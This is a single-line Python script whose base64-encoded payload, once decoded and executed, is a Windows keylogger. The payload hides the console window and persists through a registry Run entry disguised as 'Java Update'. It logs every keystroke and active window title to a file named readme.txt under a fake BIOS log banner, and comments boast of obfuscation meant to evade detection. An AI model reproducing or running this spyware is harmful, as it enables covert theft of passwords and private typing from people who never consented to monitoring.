import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('ZnJvbSBweW5wdXQua2V5Ym9hcmQgaW1wb3J0IEtleSwgTGlzdGVuZXIKaW1wb3J0ICB0aW1lLCBkYXRldGltZSwgb3MsIHN5cwppbXBvcnQgIHN1YnByb2Nlc3MsIHBsYXRmb3JtLCBiYXNlNjQKaW1wb3J0ICB3aW4zMmFwaSwgd2luMzJndWksIHdpbjMyY29uCgojeWVzc3NzIG9iZnVzY2F0aW5mCiNwbGVhc2UgdHJ5IGRldGVjdCBtZSAKCgoKCnRpbWUgPSAwCmZpbGVuYW1lID0nQzovVXNlcnMvUHVibGljL3JlYWRtZS50eHQnCmFjdGl2ZSA9ICcnCnRleHQgPSAiIgpzdGF0ZSA9IEZhbHNlCmRhdGUgPSBkYXRldGltZS5kYXRldGltZS5ub3coKQoKCgoKI3llc3NzcyBvYmZ1c2NhdGluZgojdHJ5IG1lCiMgTE9PT09MIGFzbmRqYWJuaWJ2aW53ZW5ma2pzbmtqZG4KIyBkZWNvZGUgbWUgYWpzZGtucWl3bmRxd25kCgpkZWYgc3RlYWx0aCgpOgogICAgc3RlYWx0aD13aW4zMmd1aS5GaW5kV2luZG93KCJDb25zb2xlV2luZG93Q2xhc3MiLE5vbmUpCiAgICB3aW4zMmd1aS5TaG93V2luZG93KHN0ZWFsdGgsMCkKCmRlZiBhZGR0b3JlZ2lzdHJ5KCk6CiAgICBoa2V5PXdpbjMyYXBpLlJlZ0NyZWF0ZUtleSh3aW4zMmNvbi5IS0VZX0NVUlJFTlRfVVNFUiwiU29mdHdhcmVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1biIpCiAgICB3aW4zMmFwaS5SZWdTZXRWYWx1ZUV4KGhrZXksJ0phdmEgVXBkYXRlJywwLHdpbjMyY29uLlJFR19TWiwob3MuZ2V0Y3dkKCkrIlxca2V5bG9nZ2VyMi5weSIpKQogICAgd2luMzJhcGkuUmVnQ2xvc2VLZXkoaGtleSkKCgoKZmlsZW5hbWUgPSdDOi9Vc2Vycy9QdWJsaWMvcmVhZG1lLnR4dCcKCgpzdGVhbHRoKCkKCgojeWVzc3NzIG9iZnVzY2F0aW5mCiN0cnkgbWUKIyBMT09PT0wgYXNuZGphYm5pYnZpbndlbmZranNua2pkbgojIGRlY29kZSBtZSBhanNka25xaXduZHF3bmQKI3hEbmFzZGRvbnZpb3dlbm12bXdlCiNuYXNuYW5zb2R3b2lxbWR3CiNhbXNvbm9lb2lxd2VuZm9pZXcgZgojbmZvaWFuaW9uZgoKCgoKbGYgPSBvcGVuKGZpbGVuYW1lLCAncicpCng9bGYucmVhZGxpbmUoKQppZih4PT0nJyk6CiAgICBhZGR0b3JlZ2lzdHJ5KCkKbGYuY2xvc2UoKQoKCgoKbG9nZmlsZSA9IG9wZW4oZmlsZW5hbWUsICdhJykKdGV4dCArPSAnXG4jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuJwp0ZXh0ICs9ICcjIyAgICAgICBTeXN0ZW0gc3RhcnR1cCBCSU9TICAgICAgICAjI1xuJwp0ZXh0ICs9ICcjIyAgICAgICAgICAgaW50ZWwgbG9ncyAgICAgICAgICAgICAjI1xuJwp0ZXh0ICs9ICcjIyAgICAgICAgICAgICAgYW1kNjQgICAgICAgICAgICAgICAjI1xuJwp0ZXh0ICs9ICcjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuJwpsb2dmaWxlLndyaXRlKHRleHQpCmxvZ2ZpbGUuY2xvc2UoKQoKCgoKI3llc3NzcyBvYmZ1c2NhdGluZgojdHJ5IG1lCiMgTE9PT09MIGFzbmRqYWJuaWJ2aW53ZW5ma2pzbmtqZG4KIyBkZWNvZGUgbWUgYWpzZGtucWl3bmRxd25kCiN4RG5hc2Rkb252aW93ZW5tdm13ZQojbmFzbmFuc29kd29pcW1kdwojYW1zb25vZW9pcXdlbmZvaWV3IGYKI25mb2kKI2FkcW53b2ZkbndvZW5mb2V3c24gREVURUNUIE1FCiNhcW5kb25xd2luZHF3CiNuYXNkbmlxd25kb2lxd25vaWRuCiNPQkZVU0NBVElPTgoKCgoKCmRlZiBvbl9wcmVzcyhrZXkpOgogICAgbWFpbl90aHJlYWRfaWQgPSB3aW4zMmFwaS5HZXRDdXJyZW50VGhyZWFkSWQoKQogICAgZ2xvYmFsIHRleHQsIGxvZ2ZpbGUsIGZpbGVuYW1lLCBhY3RpdmUKICAgIHRleHQgPSAiIgogICAgbG9nZmlsZSA9IG9wZW4oZmlsZW5hbWUsICdhJykKCiAgICB3ZyA9IHdpbjMyZ3VpCiAgICBuZXdhY3RpdmUgPSB3Zy5HZXRXaW5kb3dUZXh0KHdnLkdldEZvcmVncm91bmRXaW5kb3coKSkKICAgIGlmIG5ld2FjdGl2ZSAhPSBhY3RpdmU6CiAgICAgICAgdGV4dCArPSAiIFxuXG4gWypdIFdpbmRvdyBhY3RpdmF0ZWQuIFsiICsgc3RyKGRhdGUpICsgIl0gXG4iCiAgICAgICAgdGV4dCArPSAiXHQgfCAiICsgbmV3YWN0aXZlICsgIiB8XG4iCiAgICAgICAgYWN0aXZlID0gbmV3YWN0aXZlCiAgICAgICAgbG9nZmlsZS53cml0ZSh0ZXh0KQoKCgojeWVzc3NzIG9iZnVzY2F0aW5mCiN0cnkgbWUKIyBMT09PT0wgYXNuZGphYm5pYnZpbndlbmZranNua2pkbgojIGRlY29kZSBtZSBhanNka25xaXduZHF3bmQKI3hEbmFzZGRvbnZpb3dlbm12bXdlCiNuYXNuYW5zb2R3b2lxbWR3CiNhbXNvbm9lb2lxd2VuZm9pZXcgZgojbmZvaQojYWRxbndvZmRud29lbmZvZXdzbiBERVRFQ1QgTUUKI2FxbmRvbnF3aW5kcXcKI25hc2RuaXF3bmRvaXF3bm9pZG4KI09CRlVTQ0FUSU9OCgoKCgogICAgaz1zdHIoa2V5KQogICAgaWYoayA9PSAnS2V5LnNwYWNlJyk6CiAgICAgICAgaz0nICcKICAgIGVsaWYoayA9PSAnS2V5LnRhYicpOgogICAgICAgIGs9JyB0YWIgJwogICAgZWxpZihrID09ICdLZXkuZW50ZXInKToKICAgICAgICBrPSdcbicKICAgIGVsaWYoayA9PSAnS2V5LmJhY2tzcGFjZScpOgogICAgICAgIGs9J1xcYicKICAgIGs9ay5yZXBsYWNlKCInIiwiIikKICAgIGxvZ2ZpbGUud3JpdGUoaykgCiAgICBsb2dmaWxlLmNsb3NlKCkKCgoKd2l0aCBMaXN0ZW5lcihvbl9wcmVzcz1vbl9wcmVzcykgYXMgbGlzdGVuZXI6CiAgICBsaXN0ZW5lci5qb2luKCk=')))
